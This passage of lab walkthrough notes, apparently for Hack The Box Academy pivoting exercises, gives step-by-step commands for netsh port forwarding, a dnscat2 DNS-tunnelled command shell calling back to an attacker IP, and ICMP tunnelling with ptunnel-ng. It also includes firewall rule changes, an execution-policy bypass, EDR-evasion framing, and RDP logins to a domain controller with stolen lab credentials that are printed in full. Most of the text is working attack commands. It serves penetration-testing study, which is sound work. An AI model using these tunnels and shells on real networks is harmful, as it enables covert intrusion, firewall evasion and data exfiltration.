Now that everything is mapped, open a clean terminal on your Kali machine and pull the web server's content directly through the proxy chain:

Bash

```
proxychains curl -s http://172.16.5.135:80
```

***

***

## Port Forwarding with Windows Netsh

When you compromise a Windows server that sits on the edge of an internal network, you are essentially standing on a bridge. The machine has two network interfaces: one facing you (the internet/external side) and one facing the isolated internal network (the private Active Directory or database side).

Because your Kali machine cannot talk to the internal network directly, you must force the compromised Windows server to pass your traffic. In the offensive security world, there are three primary ways to achieve this, depending on whether you want to **"Live off the Land"** (using native Windows tools) or **drop external binaries**.

### Method 1: The Native Route — `Netsh Portproxy` (Living off the Land)

#### 📘 The Theory

If you don't want to upload any custom hacking tools to the Windows server (which helps evade antivirus/EDR detection), you use native Windows configuration tools. You tell the Windows operating system to listen on an open port on its external interface and forward any incoming traffic directly to a specific internal target IP and port.

#### 💻 The Commands

**Step 1: Set up the proxy link on the compromised Windows server** (via administrative command prompt/PowerShell):

DOS

```
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.94.144 connectport=80 connectaddress=172.16.5.135
```

**Step 2: Open the Windows Firewall** (Crucial, or the traffic will be blocked):

PowerShell

```
New-NetFirewallRule -DisplayName "Inbound Pivot" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
```

**Step 3: Launch your attack from Kali** by targeting the Windows pivot machine directly:

Bash

```
curl http://10.129.94.144:8080
```

* **Pros:** Stealthy; no tools uploaded; uses trusted system configurations.
* **Cons:** Single-port focus. If you want to access 5 different internal servers, you have to write 5 different netsh rules.

***

***

## DNS Tunneling with Dnscat2

In heavily secured corporate environments, network administrators block almost all outbound traffic. Firewalls will block direct reverse shells over random TCP ports, and web proxies will actively decrypt and sniff HTTPS connections to catch standard web-based malware.

However, there is one protocol that **must** be left open for the network to function: **DNS (Domain Name System) on Port 53 UDP**. Without DNS, internal machines cannot resolve domain names to connect to active directory assets or updates.

#### How Dnscat2 Exploits This

Instead of sending your command-and-control (C2) data directly over a standard TCP connection, `dnscat2` chops your data up, encrypts it, encodes it into text strings, and packs it inside legitimate-looking DNS queries (specifically **TXT, CNAME, or MX records**).

1. **The Client (Windows Host)** wants to execute a command or send data back to you. It takes that data, turns it into a sub-domain string (e.g., `insecuredatahere.inlanefreight.local`), and sends it out as a normal DNS query.
2. **The Corporate DNS Server** receives the query. It doesn't know it's a hacking tool; it thinks it's a real web address request. It forwards the request out to the internet to find the authoritative server for that domain.
3. **The Server (Your Kali Machine)** intercepts the incoming query because it is listening on port 53. It strips away the DNS wrapper, extracts the encoded text string, decrypts it, and displays the execution output on your terminal.

Because the compromised host only ever talks directly to its own legitimate internal company DNS server, perimeter firewalls see absolutely zero direct traffic between the target and your Kali machine. It is a highly effective, stealthy way to bypass firewalls and exfiltrate data.

### The Practical Playbook: Step-by-Step Commands

Based on your active Hack The Box lab target (`10.129.94.162`) and your attack IP (`10.10.16.42`), here is the exact sequence of operations to establish the tunnel.

#### Phase 1: Setting Up the Server on Kali

First, clean up your Ruby environment and launch the listener on your machine.

Bash

```
# 1. Navigate to the server folder
cd /home/umedh/tools/dnscat2/server

# 2. Ensure all specific versions are locked down globally
sudo gem install bundler
sudo bundle install

# 3. Stop any native system DNS listeners to free up Port 53
sudo systemctl stop systemd-resolved 2>/dev/null

# 4. Start the server (Using bundle exec to prevent version mismatches)
sudo bundle exec ruby dnscat2.rb --dns host=10.10.16.42,port=53,domain=inlanefreight.local --no-cache
```

Once the server executes, it will generate a large hexadecimal string labeled as the **`--secret`** (the pre-shared key). **Copy this key immediately.**

#### Phase 2: Deploying the Client on Windows (`10.129.94.162`)

Transfer the `dnscat2.ps1` script onto the target machine (using the PowerShell basic parsing download tricks you practiced earlier).

Open an administrative PowerShell prompt on the Windows server and execute the following:

PowerShell

```
# 1. Bypass execution policies and import the script module
Set-ExecutionPolicy Bypass -Scope Process -Force
Import-Module .\dnscat2.ps1

# 2. Launch the client backconnect
Start-Dnscat2 -DNSserver 10.10.16.42 -Domain inlanefreight.local -PreSharedSecret <YOUR_COPIED_SECRET_KEY> -Exec cmd
```

_Make sure to paste your exact key into the `-PreSharedSecret` parameter._

#### Phase 3: Interacting and Dropping into the Shell (Kali Side)

Look back at your Kali terminal window. You will see text pop up stating: `New window created: 1` along with confirmation that the session is **`ENCRYPTED AND VERIFIED!`**

To interact with this new inbound C2 connection:

Bash

```
# 1. See all active tunnels/connections
dnscat2> windows

# 2. Interact with the new shell session (Window 1)
dnscat2> window -i 1

# 3. Drop into the native Windows Command Prompt
C:\Windows\system32> dir
```

You now have a fully functional command shell running entirely inside DNS queries. You can now execute commands to find and read your target flag file.

### Key Parameters & Flags Breakdown

| **Parameter / Flag**   | **Interface** | **What It Actually Does**                                                                                           |
| ---------------------- | ------------- | ------------------------------------------------------------------------------------------------------------------- |
| **`--no-cache`**       | Server        | Prevents upstream caching servers from saving data packets, ensuring every exchange goes live through the tunnel.   |
| **`-PreSharedSecret`** | Client        | The encryption key. Prevents other security researchers or third parties from hijacking your active tunnel session. |
| **`-Exec cmd`**        | Client        | Tells the client to automatically spawn a `cmd.exe` process and link its inputs and outputs directly to the stream. |

***

***

## ICMP Tunneling with SOCKS

When a next-generation firewall blocks all outbound TCP and UDP connections, it becomes impossible to establish regular reverse shells or standard proxy tunnels (like SSH or Chisel).

However, network administrators often leave **ICMP (Internet Control Message Protocol)** open so that `ping` commands still work for network diagnostics.

**ICMP Tunneling** exploits this by taking your operational traffic (like an SSH session or SOCKS proxy data) and packing it directly inside the payload data field of standard **ICMP Echo Request** and **Echo Reply** packets.

To the network firewall, it simply looks like the machines are constantly pinging each other. The firewall passes the packets without inspection, allowing you to bypass strict egress traffic limitations.

### Complete Lab Challenge Execution Guide

Here is the exact step-by-step path to construct the tunnel, pivot to the internal domain controller, and retrieve the flag.

#### Step 1: Clone and Build `ptunnel-ng` on Kali

Open a terminal on your Kali machine (`10.10.16.42`). If you haven't compiled the binary yet, configure it as a **static binary** so it runs perfectly on the target machine without complaining about missing Linux system libraries:

Bash

```
# 1. Clone the repository
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng/

# 2. Install essential build tools
sudo apt install automake autoconf -y

# 3. Modify the configuration script to enforce static linking
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh

# 4. Run the compilation engine
sudo ./autogen.sh
```

This builds a completely independent, portable binary inside the `src/` directory.

#### Step 2: Transfer the Tool to the Ubuntu Pivot Host

Push the entire compiled project directory from Kali to the compromised Ubuntu gateway (`10.129.202.64`):

Bash

```
scp -r ../ptunnel-ng ubuntu@10.129.202.64:~/
```

_(Provide the password `HTB_@cademy_stdnt!` when prompted)._

#### Step 3: Start the `ptunnel-ng` Server on the Ubuntu Target

SSH into the Ubuntu pivot machine, navigate to the `src` subdirectory where your compiled binary sits, and start the server rule:

Bash

```
ssh ubuntu@10.129.202.64
cd ~/ptunnel-ng/src/
sudo ./ptunnel-ng -r 10.129.202.64 -R 22
```

* **`-r 10.129.202.64`**: Tells the tool to listen for incoming connections specifically on this interface IP address.
* **`-R 22`**: Instructs the tool that once it pulls your hidden traffic out of the ping packets, it should drop it natively into the host's local SSH service on **Port 22**.

#### Step 4: Connect from Kali (Build the Bridge)

Open a brand new terminal window on your **Kali machine** and run the client engine to tie your local port `2222` straight into the ICMP stream:

Bash

```
cd ~/ptunnel-ng/src/
sudo ./ptunnel-ng -p 10.129.202.64 -l 2222 -r 10.129.202.64 -R 22
```

* **`-p 10.129.202.64`**: The target server address where Kali will shoot the payload-carrying pings.
* **`-l 2222`**: Creates a local listening port on Kali. Any data dropped into port `2222` is instantly encapsulated into pings and sent down the tunnel.

#### Step 5: Start the Dynamic SSH Proxy Over ICMP

Now that the ICMP bridge is running between Kali port `2222` and Ubuntu port `22`, use standard SSH to initiate a dynamic SOCKS proxy.

Open a new terminal on **Kali** and execute:

Bash

```
ssh -D 9050 -p 2222 -l ubuntu 127.0.0.1
```

_(Enter the password `HTB_@cademy_stdnt!`)_

By connecting to your own local loopback address (`127.0.0.1`) on port `2222`, the traffic is captured by `ptunnel-ng`, hidden inside ping requests, unboxed on the Ubuntu machine, and passed directly into the SSH daemon. This builds a clean **SOCKS4/5 proxy listening on Kali port 9050**.

#### Step 6: Verify Proxychains Alignment

Ensure your proxy configuration is set up properly to catch the SSH socket traffic.

Open `/etc/proxychains4.conf` on Kali:

Bash

```
sudo nano /etc/proxychains4.conf
```

Ensure the very bottom of the file matches your dynamic proxy configuration:

Plaintext

```
[ProxyList]
socks5  127.0.0.1  9050
```

#### Step 7: Connect to the DC and Read the Flag

With port 3389 verified open on the target Domain Controller (`172.16.5.19`), use `xfreerdp` wrapped inside `proxychains` to log in using Victor's stolen credentials:

Bash

```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /cert:ignore +clipboard
```

Once the RDP desktop interface initializes:

1. Press `Win + R`, type `cmd.exe`, and press enter.
2.  Read the contents of your target flag text file directly:

    DOS

    ```
    type C:\Users\victor\Downloads\flag.txt
    ```

***

***
